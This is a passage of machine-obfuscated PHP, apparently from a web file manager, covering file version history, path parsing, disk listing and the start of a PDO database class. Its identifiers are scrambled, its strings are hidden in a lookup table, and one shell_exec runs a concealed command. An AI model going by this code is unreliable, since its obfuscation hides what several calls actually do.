$æõØ¿Ÿ¿ == $áö«Ï¸¬[1221] ? 5 : $ÖÌ·……ø; if ($ÖÌ·……ø <= 0) { return; } $¤„Õ©„ = IO::hashSimple($í‹¯Âµ‘); $ÍØÎÌêç = IO::info($í‹¯Âµ‘); $Èµ’Åúû = $âòÉé±¹[$áö«Ï¸¬[366]]; if ($ÍØÎÌêç[$áö«Ï¸¬[80]] == 0) { return; } if ($ÍØÎÌêç[$áö«Ï¸¬[80]] >= 1024 * 1024 * 500) { return !1; } if ($Èµ’Åúû && $Èµ’Åúû[0][$áö«Ï¸¬[172]] == $¤„Õ©„) { return !0; } if (array_key_exists($áö«Ï¸¬[197], $ÍØÎÌêç) && !$ÍØÎÌêç[$áö«Ï¸¬[197]]) { return !1; } $íäµÉÃã = short_id(time()); $¦•¼âüº = array($áö«Ï¸¬[403] => $íäµÉÃã, $áö«Ï¸¬[172] => $¤„Õ©„, $áö«Ï¸¬[32] => $ÍØÎÌêç[$áö«Ï¸¬[32]] . $áö«Ï¸¬[10] . date($áö«Ï¸¬[1222]) . rand_string(1), $áö«Ï¸¬[80] => $ÍØÎÌêç[$áö«Ï¸¬[80]], $áö«Ï¸¬[454] => USER_ID, $áö«Ï¸¬[195] => time(), $áö«Ï¸¬[1223] => $áö«Ï¸¬[12]); IO::mkdir($âòÉé±¹[$áö«Ï¸¬[1224]]); $Ô§øÇ = IO::copy($í‹¯Âµ‘, $âòÉé±¹[$áö«Ï¸¬[1224]], !1, $¦•¼âüº[$áö«Ï¸¬[32]]); if (!$Ô§øÇ) { self::clearEmptyFolder($âòÉé±¹[$áö«Ï¸¬[1224]]); return !1; } array_unshift($Èµ’Åúû, $¦•¼âüº); if (count($Èµ’Åúû) > $¹â¸óÍ“) { $Œ‡´Ù¤ = array_slice($Èµ’Åúû, $¹â¸óÍ“); foreach ($Œ‡´Ù¤ as $ĞÙ§£™â) { IO::remove($âòÉé±¹[$áö«Ï¸¬[1224]] . $ĞÙ§£™â[$áö«Ï¸¬[32]]); } $Èµ’Åúû = array_slice($Èµ’Åúû, 0, $¹â¸óÍ“); } return self::saveData($âòÉé±¹[$áö«Ï¸¬[1225]], $Èµ’Åúû); } public static function remove($Ø§»§Ğ, $ğÀú÷»İ) { $ŸÎäÏ¶é =& $_SERVER[Æ š¦İÈ]; $¨ÇÅ¤‘ï = self::listData($Ø§»§Ğ); $†•¸¤¸ = array(); if (!$¨ÇÅ¤‘ï) { return !1; } foreach ($¨ÇÅ¤‘ï[$ŸÎäÏ¶é[366]] as $Ûµ¹) { if ($Ûµ¹[$ŸÎäÏ¶é[403]] == $ğÀú÷»İ) { IO::remove($¨ÇÅ¤‘ï[$ŸÎäÏ¶é[1224]] . $Ûµ¹[$ŸÎäÏ¶é[32]]); continue; } $†•¸¤¸[] = $Ûµ¹; } return self::saveData($¨ÇÅ¤‘ï[$ŸÎäÏ¶é[1225]], $†•¸¤¸); } public static function clear($ÉñÑ ÂÍ, $à¯‹¹âº = true) { $…Ñ•Ì =& $_SERVER[Æ š¦İÈ]; $öóÍ“Ú = self::listData($ÉñÑ ÂÍ, $à¯‹¹âº); if (!$öóÍ“Ú) { return !1; } foreach ($öóÍ“Ú[$…Ñ•Ì[366]] as $ö½İŞê†) { IO::remove($öóÍ“Ú[$…Ñ•Ì[1224]] . $ö½İŞê†[$…Ñ•Ì[32]]); } return self::saveData($öóÍ“Ú[$…Ñ•Ì[1225]], array()); } public static function moveHistory($‚±ôñ‘“, $‰Ç±›é = '', $ìÕÙñÄ = '') { $˜ööŞÏƒ =& $_SERVER[Æ š¦İÈ]; $ğˆÁ’½À = self::listData($‚±ôñ‘“, !1); if (!$ğˆÁ’½À || !$ğˆÁ’½À[$˜ööŞÏƒ[366]]) { return !1; } $¼“Äœ¶í = $˜ööŞÏƒ[1212]; $‰Ç±›é = $‰Ç±›é ? $‰Ç±›é : get_path_this($‚±ôñ‘“); $ìÕÙñÄ = $ìÕÙñÄ ? $ìÕÙñÄ : $ğˆÁ’½À[$˜ööŞÏƒ[1224]]; $ô¢îãù = substr(get_path_this($ğˆÁ’½À[$˜ööŞÏƒ[1225]]), 0, -strlen($¼“Äœ¶í)); foreach ($ğˆÁ’½À[$˜ööŞÏƒ[366]] as $È·«ÆÈ€ => $¨¯ôüş) { $¥àŸäÒÛ = $‰Ç±›é . substr($¨¯ôüş[$˜ööŞÏƒ[32]], strlen($ô¢îãù)); $†ğ×—íì = IO::move($ğˆÁ’½À[$˜ööŞÏƒ[1224]] . $¨¯ôüş[$˜ööŞÏƒ[32]], $ìÕÙñÄ, !1, $¥àŸäÒÛ); if ($†ğ×—íì) { $ğˆÁ’½À[$˜ööŞÏƒ[366]][$È·«ÆÈ€][$˜ööŞÏƒ[32]] = $¥àŸäÒÛ; } } $ğˆÁ’½À[$˜ööŞÏƒ[1225]] = IO::move($ğˆÁ’½À[$˜ööŞÏƒ[1225]], $ìÕÙñÄ, !1, $‰Ç±›é . $¼“Äœ¶í); self::saveData($ğˆÁ’½À[$˜ööŞÏƒ[1225]], $ğˆÁ’½À[$˜ööŞÏƒ[366]]); self::clearEmptyFolder($ğˆÁ’½À[$˜ööŞÏƒ[1224]]); } public static function rollback($À³ÀòŞˆ, $½İÅˆÔÒ) { $§©áø©ò =& $_SERVER[Æ š¦İÈ]; $öÓÕÔ»• = self::listData($À³ÀòŞˆ); if (!$öÓÕÔ»•) { return; } $ÚÏé•¨ = IO::info($À³ÀòŞˆ); foreach ($öÓÕÔ»•[$§©áø©ò[366]] as $ë²êæõ´ => $¶÷õÆÛ™) { if ($¶÷õÆÛ™[$§©áø©ò[403]] == $½İÅˆÔÒ) { self::add($À³ÀòŞˆ); $’Š¢¢ñ‚ = $öÓÕÔ»•[$§©áø©ò[1224]] . $¶÷õÆÛ™[$§©áø©ò[32]]; $·ÅôÒ´ß = IO::copy($’Š¢¢ñ‚, IO::pathFather($À³ÀòŞˆ), REPEAT_REPLACE, $ÚÏé•¨[$§©áø©ò[32]]); if ($·ÅôÒ´ß) { self::remove($À³ÀòŞˆ, $½İÅˆÔÒ); } return $·ÅôÒ´ß; } } return !1; } public static function setDetail($¹Ëßúôê, $ÖÀ¯æ’ª, $â„ó÷Óâ) { $çì»òü³ =& $_SERVER[Æ š¦İÈ]; $ì±ì¥¿ = self::listData($¹Ëßúôê); if (!$ì±ì¥¿) { return; } foreach ($ì±ì¥¿[$çì»òü³[366]] as $Ä·îÃş© => $ÙãâÊÚ) { if ($ÙãâÊÚ[$çì»òü³[403]] == $ÖÀ¯æ’ª) { $ì±ì¥¿[$çì»òü³[366]][$Ä·îÃş©][$çì»òü³[1223]] = $â„ó÷Óâ; self::saveData($ì±ì¥¿[$çì»òü³[1225]], $ì±ì¥¿[$çì»òü³[366]]); return !0; } } return !1; } public static function fileInfo($•ÄÈ¨¢Û, $ºÓËŞó) { $¹¾Î­›Ë =& $_SERVER[Æ š¦İÈ]; $†ïÙ¤šõ = self::listData($•ÄÈ¨¢Û); if (!$†ïÙ¤šõ) { show_json(LNG($¹¾Î­›Ë[106]), !1); } $Èøõ¨Æ¹ = $¹¾Î­›Ë[12]; foreach ($†ïÙ¤šõ[$¹¾Î­›Ë[366]] as $¥¿£¿Óô => $Í£è§™ù) { if ($Í£è§™ù[$¹¾Î­›Ë[403]] != $ºÓËŞó) { continue; } $Èøõ¨Æ¹ = $†ïÙ¤šõ[$¹¾Î­›Ë[1224]] . $Í£è§™ù[$¹¾Î­›Ë[32]]; break; } if (!$Èøõ¨Æ¹) { show_json(LNG($¹¾Î­›Ë[106]), !1); } return IO::info($Èøõ¨Æ¹); } public static function fileOut($›ÔöúÒ¨, $¿‘Ã¢‚ù, $ó†ğü÷† = false) { $ôÄÒ³¼ô =& $_SERVER[Æ š¦İÈ]; $§Ò—ğÊ® = self::fileInfo($›ÔöúÒ¨, $¿‘Ã¢‚ù); $‘·…¾çş =& $GLOBALS[$ôÄÒ³¼ô[7]]; $ó†ğü÷† = isset($‘·…¾çş[$ôÄÒ³¼ô[1188]]) && $‘·…¾çş[$ôÄÒ³¼ô[1188]] == 1; if (isset($‘·…¾çş[$ôÄÒ³¼ô[33]]) && $‘·…¾çş[$ôÄÒ³¼ô[33]] == $ôÄÒ³¼ô[1226]) { return IO::fileOutImage($§Ò—ğÊ®[$ôÄÒ³¼ô[78]], $‘·…¾çş[$ôÄÒ³¼ô[1227]]); } IO::fileOut($§Ò—ğÊ®[$ôÄÒ³¼ô[78]], $ó†ğü÷†, get_path_this($›ÔöúÒ¨)); } public static function listData($şşÒıºä, $íÉ¨‹—‹ = true) { $ğé±Üï =& $_SERVER[Æ š¦İÈ]; if ($íÉ¨‹—‹ && !IO::exist($şşÒıºä)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($şşÒıºä, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $²¥¾œõ = self::pathHistory($şşÒıºä); $à×Ÿ‘ô = array($ğé±Üï[1225] => $²¥¾œõ . $ğé±Üï[1212], $ğé±Üï[1224] => rtrim(get_path_father($²¥¾œõ), $ğé±Üï[8]) . $ğé±Üï[8], $ğé±Üï[366] => array()); $¦ñ¡¬ìß = IO::getContent($à×Ÿ‘ô[$ğé±Üï[1225]]); if ($¦ñ¡¬ìß) { $ ÖÎ¿Ö = json_decode($¦ñ¡¬ìß, !0); if (is_array($ ÖÎ¿Ö)) { $à×Ÿ‘ô[$ğé±Üï[366]] = $ ÖÎ¿Ö; } } return $à×Ÿ‘ô; } private static function saveData($ôüÀâÎ¦, $«©îŠä…) { $µ“‡ğäÏ =& $_SERVER[Æ š¦İÈ]; self::log($µ“‡ğäÏ[1228] . $ôüÀâÎ¦ . $µ“‡ğäÏ[71] . count($«©îŠä…), $µ“‡ğäÏ[749]); if ($«©îŠä…) { return IO::setContent($ôüÀâÎ¦, json_encode($«©îŠä…)); } $î¹‹Àğ = IO::pathFather($ôüÀâÎ¦); IO::remove($ôüÀâÎ¦); self::clearEmptyFolder($î¹‹Àğ); return !0; } public static function clearEmptyFolder($–¿’Äğà) { $ÍÛÉõ»³ =& $_SERVER[Æ š¦İÈ]; if (trim($–¿’Äğà, $ÍÛÉõ»³[8]) == trim(self::$_historyBase, $ÍÛÉõ»³[8])) { return; } $óæº™»¾ = IO::pathFather($–¿’Äğà); $–ÈØšä¿ = IO::has($–¿’Äğà, !0); if ($–ÈØšä¿[$ÍÛÉõ»³[204]] > 0 || $–ÈØšä¿[$ÍÛÉõ»³[205]] > 0) { return; } IO::remove($–¿’Äğà); self::clearEmptyFolder($óæº™»¾); } private static function getBasePath() { $º²å°¸ã =& $_SERVER[Æ š¦İÈ]; $¢›¡½ıˆ = Model($º²å°¸ã[1229])->get($º²å°¸ã[1230]); if ($¢›¡½ıˆ) { if (!IO::exist($¢›¡½ıˆ)) { IO::mkdir($¢›¡½ıˆ); } if (get_path_this($¢›¡½ıˆ) == $º²å°¸ã[1215]) { $²µ¤Ÿ¸ = $º²å°¸ã[1231] . rand_string(8); @rename($¢›¡½ıˆ, get_path_father($¢›¡½ıˆ) . $º²å°¸ã[8] . $²µ¤Ÿ¸); $¢›¡½ıˆ = DATA_PATH . $²µ¤Ÿ¸ . $º²å°¸ã[8]; file_put_contents(DATA_PATH . $º²å°¸ã[1232], $º²å°¸ã[12]); Model($º²å°¸ã[1229])->set($º²å°¸ã[1230], $¢›¡½ıˆ); } return $¢›¡½ıˆ; } $¢›¡½ıˆ = DATA_PATH . $º²å°¸ã[1231] . rand_string(8) . $º²å°¸ã[8]; $¢›¡½ıˆ = IO::mkdir($¢›¡½ıˆ); $¢›¡½ıˆ = rtrim($¢›¡½ıˆ, $º²å°¸ã[8]) . $º²å°¸ã[8]; file_put_contents($¢›¡½ıˆ . $º²å°¸ã[1232], $º²å°¸ã[12]); file_put_contents(DATA_PATH . $º²å°¸ã[1232], $º²å°¸ã[12]); Model($º²å°¸ã[1229])->set($º²å°¸ã[1230], $¢›¡½ıˆ); return $¢›¡½ıˆ; } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\143\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\x52\x65\143\171\143\x6c\x65\x7d"; const KOD_USER_FAV = "\173\165\163\145\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\x72\x46\x69\x6c\145\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\x72\106\x69\x6c\x65\x54\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\165\x70\122\x6f\x6f\164\123\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\165\163\x65\162\123\x68\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\123\x68\x61\x72\x65\114\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\x72\x65\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\162\x65\x49\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\x68\141\x72\145\111\164\145\155\x4c\151\x6e\x6b\175"; const KOD_SEARCH = "\173\x73\145\141\x72\143\150\175"; const KOD_BLOCK = "\173\142\154\x6f\x63\x6b\175"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\165\163\x65\162\x52\145\x6e\143\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\162\x69\166\x65\x72\175"; public static function typeList() { $²ĞˆúÓ =& $_SERVER[Æ š¦İÈ]; return array($²ĞˆúÓ[1233] => self::KOD_SOURCE, $²ĞˆúÓ[1234] => self::KOD_USER_RECYCLE, $²ĞˆúÓ[1235] => self::KOD_USER_FAV, $²ĞˆúÓ[1236] => self::KOD_USER_FILE_TAG, $²ĞˆúÓ[1237] => self::KOD_USER_FILE_TYPE, $²ĞˆúÓ[1238] => self::KOD_GROUP_ROOT_SELF, $²ĞˆúÓ[1239] => self::KOD_USER_SHARE, $²ĞˆúÓ[1240] => self::KOD_USER_SHARE_LINK, $²ĞˆúÓ[1241] => self::KOD_USER_SHARE_TO_ME, $²ĞˆúÓ[1242] => self::KOD_SHARE_ITEM, $²ĞˆúÓ[1243] => self::KOD_SHARE_LINK, $²ĞˆúÓ[1244] => self::KOD_SEARCH, $²ĞˆúÓ[1245] => self::KOD_BLOCK, $²ĞˆúÓ[1246] => self::KOD_IO, $²ĞˆúÓ[1247] => self::KOD_USER_RECENT, $²ĞˆúÓ[1248] => self::KOD_USER_DRIVER); } public static function parse($€°èóÕİ) { $ˆõŠÕç =& $_SERVER[Æ š¦İÈ]; $€°èóÕİ = self::clear($€°èóÕİ); $ÒÉ¢ş¥ = array_values(self::typeList()); preg_match($ˆõŠÕç[1249], $€°èóÕİ, $ñòÆßû); $†‡Ö’Ïà = array($ˆõŠÕç[425] => !1, $ˆõŠÕç[1250] => !1, $ˆõŠÕç[422] => !1, $ˆõŠÕç[78] => $€°èóÕİ, $ˆõŠÕç[1159] => !1, $ˆõŠÕç[1158] => $ˆõŠÕç[12]); if (is_array($ñòÆßû) && count($ñòÆßû) == 5) { $ı¹¶÷« = $ˆõŠÕç[1251] . $ñòÆßû[2] . $ˆõŠÕç[324]; if (in_array($ı¹¶÷«, $ÒÉ¢ş¥)) { $†‡Ö’Ïà[$ˆõŠÕç[1159]] = $ñòÆßû[1]; $†‡Ö’Ïà[$ˆõŠÕç[33]] = $ı¹¶÷«; $†‡Ö’Ïà[$ˆõŠÕç[1252]] = substr($ı¹¶÷«, 1, -1); $†‡Ö’Ïà[$ˆõŠÕç[403]] = $ñòÆßû[3]; } $†‡Ö’Ïà[$ˆõŠÕç[1158]] = $ñòÆßû[4]; } $û´ÚÛ™à = array($ˆõŠÕç[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $†‡Ö’Ïà[$ˆõŠÕç[1214]] = in_array($†‡Ö’Ïà[$ˆõŠÕç[33]], $û´ÚÛ™à); return $†‡Ö’Ïà; } public static function isTruePath($éáà¢õ¡) { $¿§œšÁ =& $_SERVER[Æ š¦İÈ]; if (substr($éáà¢õ¡, 0, 1) != $¿§œšÁ[1251]) { return !0; } if (strpos($éáà¢õ¡, $¿§œšÁ[411]) === 0) { return !0; } if (strpos($éáà¢õ¡, $¿§œšÁ[1218]) === 0) { return !0; } if (strpos($éáà¢õ¡, $¿§œšÁ[1253]) === 0) { return !0; } if (strpos($éáà¢õ¡, $¿§œšÁ[1254]) === 0) { return !0; } if (strpos($éáà¢õ¡, $¿§œšÁ[1255]) === 0) { return !0; } return !1; } public static function clear($äù„ÊÓÔ) { $Š°Ò•³ =& $_SERVER[Æ š¦İÈ]; $äù„ÊÓÔ = str_replace(array($Š°Ò•³[1069], $Š°Ò•³[228]), $Š°Ò•³[53], $äù„ÊÓÔ); $äù„ÊÓÔ = str_replace($Š°Ò•³[98], $Š°Ò•³[8], $äù„ÊÓÔ); $½úî§á = $Š°Ò•³[1256]; if (substr($äù„ÊÓÔ, 0, 3) == $Š°Ò•³[1257]) { $äù„ÊÓÔ = substr($äù„ÊÓÔ, 3); } while (strstr($äù„ÊÓÔ, $½úî§á)) { $äù„ÊÓÔ = str_replace($½úî§á, $Š°Ò•³[8], $äù„ÊÓÔ); } $äù„ÊÓÔ = preg_replace($Š°Ò•³[1258], $Š°Ò•³[8], $äù„ÊÓÔ); if ($äù„ÊÓÔ == $Š°Ò•³[8]) { return $Š°Ò•³[8]; } $äù„ÊÓÔ = rtrim($äù„ÊÓÔ, $Š°Ò•³[8]); return $äù„ÊÓÔ; } public static function sourceID($™Äµ±‘) { $úƒ¼Ôá™ =& $_SERVER[Æ š¦İÈ]; $¬½³Åší = self::parse($™Äµ±‘); if ($¬½³Åší[$úƒ¼Ôá™[33]] !== self::KOD_SOURCE) { show_json(LNG($úƒ¼Ôá™[1259]), !1); } return $¬½³Åší[$úƒ¼Ôá™[403]]; } public static function make($¾ƒ½´) { if (!$¾ƒ½´) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¾ƒ½´)); } public static function makeShare($À·­şƒş, $ìŞŠ€»Ì) { return self::makePath(self::KOD_SHARE_ITEM, $À·­şƒş, $ìŞŠ€»Ì); } public static function makeFileTypePath($êÔ£‘–¼) { return self::makePath(self::KOD_USER_FILE_TYPE, $êÔ£‘–¼); } public static function makeFileTagPath($¯Êîãı) { return self::makePath(self::KOD_USER_FILE_TAG, $¯Êîãı); } public static function makePath($¶ıóş¦ü, $ûö×½·‡ = '', $±ñ“ıĞ = '') { $ãÆ“—ïË =& $_SERVER[Æ š¦İÈ]; $”®Û¡ı» = substr($¶ıóş¦ü, 1, -1); $²ãÀ÷¿Ó = $ãÆ“—ïË[1260] . $”®Û¡ı» . $ãÆ“—ïË[1261] . $ûö×½·‡ . $ãÆ“—ïË[1262]; $²ãÀ÷¿Ó = $±ñ“ıĞ ? $²ãÀ÷¿Ó . $±ñ“ıĞ . $ãÆ“—ïË[8] : $²ãÀ÷¿Ó; return $²ãÀ÷¿Ó; } public static function hashPath($Ø¬Ù¼¢ò, $»Ôßœá¶ = true) { $„ü°‹¦ =& $_SERVER[Æ š¦İÈ]; $¿£Æ–åé = is_array($Ø¬Ù¼¢ò) ? $Ø¬Ù¼¢ò : IO::info($Ø¬Ù¼¢ò); $ÊÏ–¾²ú = _get($¿£Æ–åé, $„ü°‹¦[1263], $„ü°‹¦[12]); if (!$ÊÏ–¾²ú && isset($¿£Æ–åé[$„ü°‹¦[405]])) { $¿£Æ–åé = IO::info(KodIO::make($¿£Æ–åé[$„ü°‹¦[405]])); $ÊÏ–¾²ú = _get($¿£Æ–åé, $„ü°‹¦[1263], $„ü°‹¦[12]); } if (!$ÊÏ–¾²ú && $»Ôßœá¶) { $ÄÃÁáô  = KodIO::parse($¿£Æ–åé[$„ü°‹¦[78]]); if (!$ÄÃÁáô [$„ü°‹¦[33]]) { $ÊÏ–¾²ú = IO::hashSimple($¿£Æ–åé[$„ü°‹¦[78]]); } } if (!$ÊÏ–¾²ú) { $ÊÏ–¾²ú = md5($¿£Æ–åé[$„ü°‹¦[78]] . $¿£Æ–åé[$„ü°‹¦[80]] . $¿£Æ–åé[$„ü°‹¦[86]]); } return $ÊÏ–¾²ú; } public static function initSystemPath() { $”¨Áã‡ =& $_SERVER[Æ š¦İÈ]; if (defined($”¨Áã‡[1264])) { return; } define($”¨Áã‡[1264], self::systemPath($”¨Áã‡[1265])); define($”¨Áã‡[1266], self::systemPath($”¨Áã‡[1267])); define($”¨Áã‡[1268], self::systemPath($”¨Áã‡[1269])); define($”¨Áã‡[1270], self::systemPath($”¨Áã‡[1271])); IOHistory::bindEvent(); } public static function systemPath($¨È±â˜ø) { $ïÚô¬ğú =& $_SERVER[Æ š¦İÈ]; $öñÂ‘¡ü = $ïÚô¬ğú[1272] . ucfirst($¨È±â˜ø); $Ï³³§ªÑ = Model($ïÚô¬ğú[767])->get($öñÂ‘¡ü); if ($Ï³³§ªÑ) { return $Ï³³§ªÑ; } if ($¨È±â˜ø == $ïÚô¬ğú[1265]) { $Ï³³§ªÑ = self::make(Model($ïÚô¬ğú[822])->systemRootPathAdd($ïÚô¬ğú[539])); } else { $Ï³³§ªÑ = self::systemPath($ïÚô¬ğú[1265]); $©æ‰¢•× = self::sourceID($Ï³³§ªÑ); $Ï³³§ªÑ = self::make(Model($ïÚô¬ğú[822])->mkdir($©æ‰¢•×, $¨È±â˜ø)); } Model($ïÚô¬ğú[767])->set($öñÂ‘¡ü, $Ï³³§ªÑ); return $Ï³³§ªÑ; } public static function systemFolder($”²¿êİÖ) { $ûÊ²”Â— = IO_PATH_SYSTEM_SOURCE . $”²¿êİÖ; $Ïìñší = Cache::get($ûÊ²”Â—); if (!$Ïìñší) { $¸†ÚùÂ = IO::infoFull($ûÊ²”Â—); if (!$¸†ÚùÂ) { $Ïìñší = IO::mkdir($ûÊ²”Â—, REPEAT_SKIP); } else { $Ïìñší = $¸†ÚùÂ[$_SERVER[Æ š¦İÈ][78]]; } Cache::set($ûÊ²”Â—, $Ïìñší, 3600 * 10); } return $Ïìñší; } public static function defaultDriver() { return Model($_SERVER[Æ š¦İÈ][764])->defaultDriver(); } public static function defaultIO() { $ñçâÍš =& $_SERVER[Æ š¦İÈ]; $Í´ãõé˜ = self::defaultDriver(); return $ñçâÍš[1273] . $Í´ãõé˜[$ñçâÍš[403]] . $ñçâÍš[1262]; } public static function defaultDriverInit() { static $Ğšâ©æ = false; if ($Ğšâ©æ) { return $Ğšâ©æ; } $Ğšâ©æ = IO::init(self::defaultIO()); return $Ğšâ©æ; } public static function fileTypeList() { $Ü·¨Ú§‹ =& $_SERVER[Æ š¦İÈ]; $˜ŒëÇá´ = $GLOBALS[$Ü·¨Ú§‹[6]][$Ü·¨Ú§‹[1274]]; foreach ($˜ŒëÇá´ as $¬¤•”şğ => $ô†ÎÆÉ) { $‹ÕÏ×ˆ = $Ü·¨Ú§‹[1275] . $¬¤•”şğ; $¾ì°İ‘¾ = LNG($‹ÕÏ×ˆ); if ($‹ÕÏ×ˆ != $¾ì°İ‘¾) { $˜ŒëÇá´[$¬¤•”şğ][$Ü·¨Ú§‹[32]] = $¾ì°İ‘¾; } } return $˜ŒëÇá´; } public static function diskList($Ï¿Œàë = true) { $û‰Ö´„— = $_SERVER[Æ š¦İÈ][1276]; if ($Ï¿Œàë) { $„¹º•¥í = Cache::get($û‰Ö´„—); if (is_array($„¹º•¥í)) { return $„¹º•¥í; } } $„¹º•¥í = self::diskListGet(); Cache::set($û‰Ö´„—, $„¹º•¥í, 60); return $„¹º•¥í; } public static function diskListGet() { $ŠÑ‚–¸Ã =& $_SERVER[Æ š¦İÈ]; $‹ÂÊ­å = array(); if ($GLOBALS[$ŠÑ‚–¸Ã[6]][$ŠÑ‚–¸Ã[1277]] == $ŠÑ‚–¸Ã[1278]) { $«“İáÃ¼ = $ŠÑ‚–¸Ã[1279]; for ($—ù°Ú‚Î = 0; $—ù°Ú‚Î < strlen($«“İáÃ¼); $—ù°Ú‚Î++) { $äü¢°Ÿê = $«“İáÃ¼[$—ù°Ú‚Î] . $ŠÑ‚–¸Ã[1280]; if (file_exists($äü¢°Ÿê)) { $‹ÂÊ­å[] = $äü¢°Ÿê; } } return $‹ÂÊ­å; } if (!function_exists($ŠÑ‚–¸Ã[99])) { $‹ÂÊ­å[] = $ŠÑ‚–¸Ã[832]; return $‹ÂÊ­å; } $öùÒ¢üó = explode($ŠÑ‚–¸Ã[228], shell_exec($ŠÑ‚–¸Ã[1281])); array_shift($öùÒ¢üó); array_pop($öùÒ¢üó); $ÔË¢àá = array($ŠÑ‚–¸Ã[1282], $ŠÑ‚–¸Ã[1283], $ŠÑ‚–¸Ã[1284], $ŠÑ‚–¸Ã[1285], $ŠÑ‚–¸Ã[1286], $ŠÑ‚–¸Ã[1287], $ŠÑ‚–¸Ã[1288], $ŠÑ‚–¸Ã[1289]); foreach ($öùÒ¢üó as $ö¢éÊô·) { $äÜ•§¢¥ = preg_split($ŠÑ‚–¸Ã[1290], $ö¢éÊô·); $äü¢°Ÿê = $äÜ•§¢¥[count($äÜ•§¢¥) - 1]; if (!strstr($äÜ•§¢¥[0], $ŠÑ‚–¸Ã[1291]) || !$äü¢°Ÿê) { continue; } $ûä‡æ¸ = rtrim($äü¢°Ÿê, $ŠÑ‚–¸Ã[8]) . $ŠÑ‚–¸Ã[8]; if (in_array($ûä‡æ¸, $ÔË¢àá)) { continue; } $‹ÂÊ­å[] = $ûä‡æ¸; } return $‹ÂÊ­å; } public static function isSameDisk($ä«ËŞş, $¼ƒ‹—) { $ùèÀë¶¦ =& $_SERVER[Æ š¦İÈ]; if ($GLOBALS[$ùèÀë¶¦[6]][$ùèÀë¶¦[1277]] == $ùèÀë¶¦[1278]) { return strtolower(substr($ä«ËŞş, 0, 1)) == strtolower(substr($¼ƒ‹—, 0, 1)); } $øº£¡Å§ = self::diskList(); $ã‰êš›á = !1; $ÏŸ¿û± = !1; sort($øº£¡Å§); $øº£¡Å§ = array_reverse($øº£¡Å§); $ä«ËŞş = rtrim($ä«ËŞş, $ùèÀë¶¦[8]) . $ùèÀë¶¦[8]; $¼ƒ‹— = rtrim($¼ƒ‹—, $ùèÀë¶¦[8]) . $ùèÀë¶¦[8]; foreach ($øº£¡Å§ as $ÎÊ­À…à) { $•æóª®‚ = strlen($ÎÊ­À…à); if (!$ã‰êš›á && substr($ä«ËŞş, 0, $•æóª®‚) == $ÎÊ­À…à) { $ã‰êš›á = $ÎÊ­À…à; } if (!$ÏŸ¿û± && substr($¼ƒ‹—, 0, $•æóª®‚) == $ÎÊ­À…à) { $ÏŸ¿û± = $ÎÊ­À…à; } if ($ã‰êš›á && $ÏŸ¿û±) { break; } } return $ã‰êš›á === $ÏŸ¿û±; } public static function transferType($ª¢ªê¡Ì, $´áÒÚôõ) { $ÜŒ”¥‚ş =& $_SERVER[Æ š¦İÈ]; $Š²Ş… = self::driverType($ª¢ªê¡Ì); $œµÌóæ© = self::driverType($´áÒÚôõ); if ($Š²Ş…[$ÜŒ”¥‚ş[33]] == $œµÌóæ©[$ÜŒ”¥‚ş[33]] && $Š²Ş…[$ÜŒ”¥‚ş[1292]] == $œµÌóæ©[$ÜŒ”¥‚ş[1292]]) { return $ÜŒ”¥‚ş[1293]; } if ($Š²Ş…[$ÜŒ”¥‚ş[33]] == $ÜŒ”¥‚ş[861] && $œµÌóæ©[$ÜŒ”¥‚ş[33]] == $ÜŒ”¥‚ş[107]) { return $ÜŒ”¥‚ş[1188]; } if ($Š²Ş…[$ÜŒ”¥‚ş[33]] == $ÜŒ”¥‚ş[107] && $œµÌóæ©[$ÜŒ”¥‚ş[33]] == $ÜŒ”¥‚ş[861]) { return $ÜŒ”¥‚ş[108]; } return $ÜŒ”¥‚ş[1294]; } public static function driverType($âúêÂŞ) { $‚á‚ßº¶ =& $_SERVER[Æ š¦İÈ]; $ñõÌ¤É = str_replace($‚á‚ßº¶[1295], $‚á‚ßº¶[12], strtolower($âúêÂŞ->getType())); if ($ñõÌ¤É == $‚á‚ßº¶[755] || $ñõÌ¤É == $‚á‚ßº¶[1296] || $ñõÌ¤É == $‚á‚ßº¶[1297]) { $âúêÂŞ = self::defaultDriverInit(); } else { if ($ñõÌ¤É == $‚á‚ßº¶[1195] || $ñõÌ¤É == $‚á‚ßº¶[1298]) { $âúêÂŞ = IO::init($âúêÂŞ->pathParse[$‚á‚ßº¶[1142]]); } } $É§’¾¦Ì = $âúêÂŞ->path; $ñõÌ¤É = str_replace($‚á‚ßº¶[1295], $‚á‚ßº¶[12], strtolower($âúêÂŞ->getType())); if ($ñõÌ¤É == $‚á‚ßº¶[107]) { return array($‚á‚ßº¶[33] => $‚á‚ßº¶[107], $‚á‚ßº¶[1292] => $‚á‚ßº¶[12], $‚á‚ßº¶[78] => $É§’¾¦Ì); } return array($‚á‚ßº¶[33] => $‚á‚ßº¶[861], $‚á‚ßº¶[1292] => $âúêÂŞ->pathDriver, $‚á‚ßº¶[78] => $É§’¾¦Ì); } public static function pathDriverType($–ˆê±é) { return $–ˆê±é ? self::driverType(IO::init($–ˆê±é)) : !1; } } goto eÑ¥‰ò©ïÜ; C›Æ«·§Ô‹: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($®ô•à = '') { $ê¶­ÆÃ =& $_SERVER[Æ š¦İÈ]; if (!class_exists($ê¶­ÆÃ[905])) { think_exception(think_lang($ê¶­ÆÃ[14]) . $ê¶­ÆÃ[906]); } if (!empty($®ô•à)) { $this->config = $®ô•à; if (empty($this->config[$ê¶­ÆÃ[17]])) { 